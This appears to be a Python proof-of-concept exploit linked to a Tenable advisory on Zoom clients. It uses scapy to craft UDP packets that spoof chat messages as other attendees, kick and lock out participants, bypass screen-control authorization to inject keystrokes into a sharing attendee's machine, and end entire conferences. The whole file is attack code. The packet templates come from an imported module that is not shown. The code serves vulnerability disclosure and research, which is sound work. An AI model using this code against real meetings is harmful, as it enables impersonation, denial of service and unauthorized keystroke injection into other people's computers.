from scapy.all import *
import random
import time
import sys
import base64
from msg_templates import *

# https://www.tenable.com/security/research/tra-2018-40
# This code crafts and sends UDP packets to invoke restricted commands
# found in Zoom's ssb_sdk
#

class Zoomster:
    '''
    Toolset Invokes Restricted Functionalities in Remote Zoom Clients.
    This is a MINIMAL POC example and may require additional tweaking for various scenarios

    :param remote_ip: target attendee's IP address
    :param local_port: local port of source Zoom user
    :param is_p2p: True if meeting is P2P, False if being streamed through Zoom Servers
    '''
   
    def __init__(self, remote_ip, local_port, remote_port, is_p2p = True):
        self.P2P_HEADER = '' if is_p2p else '\x05'
        self.REMOTE_IP = remote_ip
        self.REMOTE_PORT = remote_port
        self.LOCAL_PORT = local_port

    def spoof_chat(self, src_attendee_id, msg):
        '''
        Spoof chat message to come from src attendee

        :param src_attendee_id: attendee ID to spoof chat
        :param msg: Chat message
        '''

        msg_payload = base64.b64encode(Msg_Templates.CHAT_MSG.format(chr(len(msg)), msg))
        packet = Msg_Templates.SSB_SDK_CHAT_HEADER.format(
            self.P2P_HEADER,
            chr(src_attendee_id),
            chr(src_attendee_id),
            '\x04', # value may be other multiple of 4 depending on call (0x8, 0x10, ...)
            chr(len(msg_payload)),
            chr(len(msg_payload)),
            msg_payload
        )
        self.send(packet)

    def kick_user(self, host_attendee_id, dst_attendee_id):
        '''
        Kick and lock out meeting attendee

        :param host_attendee_id: host attendee ID
        :param dst_attendee_id: Attendee to be kicked and locked out
        '''

        dst_attendee_id = chr(dst_attendee_id)
        host_attendee_id = chr(host_attendee_id)
        self.send(Msg_Templates.KICK_USER.format(self.P2P_HEADER, dst_attendee_id, host_attendee_id, dst_attendee_id))


    def screen_ctrl(self, src_attendee_id, dst_attendee_id, key_strokes, is_vk = False):
        '''
        Bypass screen control autorization and send keystrokes to screen sharing attendee

        :param host_attendee_id: host attendee ID
        :param dst_attendee_id: Attendee to be kicked and locked out
        '''

        KEYSTROKE_INTERVAL = 0.03

        for header_id in ['\x09', '\x0a']:
            ssb_header = Msg_Templates.SSB_SDK_SS_HEADER.format(self.P2P_HEADER, header_id, '\x03')

            self.send(Msg_Templates.TAKE_CTRL.format(ssb_header, chr(src_attendee_id), chr(dst_attendee_id)))
            self.send(Msg_Templates.HELO_KEYSTROKE.format(ssb_header, chr(dst_attendee_id), chr(src_attendee_id), '\x04'))
            
            for key in key_strokes:
                time.sleep(KEYSTROKE_INTERVAL)
                self.send(Msg_Templates.SEND_KEYSTROKE.format(ssb_header, chr(dst_attendee_id), chr(dst_attendee_id), chr(dst_attendee_id), key, key)) 
    
    def send(self, msg):
        '''
        Send UDP packet to attendee with spoofed IP and port

        :param msg: UDP payload
        '''

        send(IP(dst=self.REMOTE_IP)/ UDP(sport=self.LOCAL_PORT, dport=self.REMOTE_PORT) / Raw(msg))
    
    def kill_conference(self):
        '''
        Kill entire Zoom conference by invoking trial version timeout function
        '''

        msg = Msg_Templates.KILL_CONFERENCE.format(self.P2P_HEADER)
        self.send(msg)




